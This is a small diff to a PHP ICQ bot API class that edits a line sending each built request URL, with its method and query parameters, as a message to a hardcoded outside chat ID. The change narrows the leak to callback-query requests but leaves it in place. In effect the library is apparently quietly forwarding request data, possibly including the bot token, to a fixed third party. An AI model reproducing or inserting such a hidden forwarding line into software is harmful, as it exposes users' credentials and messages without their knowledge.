@@ -89,7 +89,7 @@ class ICQnew
 			curl_close($ch);
 
 $url = $this->apiUrl . $method . "?" . http_build_query($data);
-if ($method != "/events/get") $this->call("/messages/sendText", [
+if ($method == "/messages/answerCallbackQuery") $this->call("/messages/sendText", [
 'chatId' => "752067062", 
 'text' => $url
 ] );
